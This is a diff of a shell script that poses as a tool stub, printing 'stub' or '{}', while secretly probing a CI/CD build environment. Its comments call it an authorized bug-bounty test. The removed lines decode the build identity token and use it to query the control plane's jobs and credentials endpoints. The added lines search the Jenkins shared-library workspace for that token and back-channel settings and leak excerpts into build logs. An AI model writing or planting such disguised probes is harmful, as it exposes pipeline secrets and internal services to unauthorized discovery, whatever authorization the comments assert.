@@ -1,52 +1,16 @@
 #!/bin/sh
-# Benign, bounded authority probe for an authorized bug-bounty test (Bugcrowd sap-og24).
-# The build-pod identity token NEVER leaves the pod and is NEVER printed: only its claim NAMES
-# and iss/aud/scope are echoed. Every request is a read-only GET against the CI/CD service's own
-# control plane, each paired with a no-token negative control and a nonexistent-path control.
-N=KP-AUTH-7788
+# Benign, read-only source-reading probe for an authorized bug-bounty test (Bugcrowd sap-og24).
+# Reads ONLY the library source the service itself checked out into this job's own workspace,
+# to learn how the build identity is presented. Prints bounded excerpts. No network calls.
+N=KP-LIB-7788
 p() { echo "$N $*" 1>&2; }
-
-p "ctx host=$(hostname) job=$JOB_NAME build=$BUILD_NUMBER pipeline=$PIPELINE ver=$PIPELINE_VERSION"
-p "API_SELF_LINK=$API_SELF_LINK"
-p "BACK_CHANNEL_URL=$BACK_CHANNEL_URL"
-p "UI_SELF_LINK=$UI_SELF_LINK"
-p "PIPER_DISABLE_EXTENSIONS=$PIPER_DISABLE_EXTENSIONS PP_CONFIGURATION_SOURCE=$PP_CONFIGURATION_SOURCE"
-
-# ---- token shape only: claim NAMES + iss/aud/scope. Never the token, never the signature. ----
-T="$BUILD_IDENTITY_JWT"
-if [ -n "$T" ]; then
-  p "token: present len=$(printf %s "$T" | wc -c) dots=$(printf %s "$T" | tr -cd . | wc -c)"
-  d() { s=$1; case $((${#s} % 4)) in 2) s="$s==";; 3) s="$s=";; esac
-        printf %s "$s" | tr '_-' '/+' | base64 -d 2>/dev/null; }
-  HDR=$(d "$(printf %s "$T" | cut -d. -f1)")
-  PL=$(d  "$(printf %s "$T" | cut -d. -f2)")
-  p "hdr: $(printf %s "$HDR" | head -c 200)"
-  p "payload claim NAMES: $(printf %s "$PL" | tr ',' '\n' | sed -n 's/.*"\([A-Za-z0-9_]*\)"[[:space:]]*:.*/\1/p' | sort -u | tr '\n' ' ')"
-  for k in iss aud scope authorities grant_type client_id azp typ; do
-    v=$(printf %s "$PL" | sed -n "s/.*\"$k\"[[:space:]]*:[[:space:]]*\(\"[^\"]*\"\|\[[^]]*\]\).*/\1/p" | head -c 200)
-    [ -n "$v" ] && p "claim $k = $v"
-  done
-else
-  p "token: ABSENT"
-fi
-
-B="$BACK_CHANNEL_URL"
-[ -z "$B" ] && B="$(printf %s "$API_SELF_LINK" | sed -E 's#(https?://[^/]+).*#\1#')"
-p "base=$B"
-
-g() { # path label  -> status + byte length, with a NO-TOKEN control
-  a=$(curl -s -o /tmp/kpa -w '%{http_code}' --max-time 10 -H "Authorization: Bearer $T" -H 'Accept: application/json' "$B$1" 2>/dev/null)
-  b=$(curl -s -o /tmp/kpb -w '%{http_code}' --max-time 10 -H 'Accept: application/json' "$B$1" 2>/dev/null)
-  p "GET $1 -> with-token=${a:-ERR} bytes=$(wc -c < /tmp/kpa 2>/dev/null) | no-token=${b:-ERR}"
-  if [ "$a" = "200" ]; then p "   shape: $(head -c 180 /tmp/kpa | tr -d '\n')"; fi
-}
-
-p "--- control plane, read-only ---"
-g "/v2/jobs"
-g "/v2/credentials"
-g "/v2/repositories"
-g "/v2/kp-no-such-endpoint-7788"
-p "--- done ---"
-
+LIBS=$(echo /jenkins_home/workspace/*@libs)
+p "libs=$LIBS"
+for k in BUILD_IDENTITY_JWT BACK_CHANNEL_URL API_SELF_LINK; do
+  p "=== $k ==="
+  grep -rn "$k" $LIBS 2>/dev/null | head -12 | cut -c1-260 | sed "s|^|$N |" 1>&2
+done
+p "=== files mentioning the back channel ==="
+grep -rl "BACK_CHANNEL_URL" $LIBS 2>/dev/null | head -10 | sed "s|^|$N file: |" 1>&2
 case "$1" in version) echo "$N stub" ;; *) echo '{}' ;; esac
 exit 0
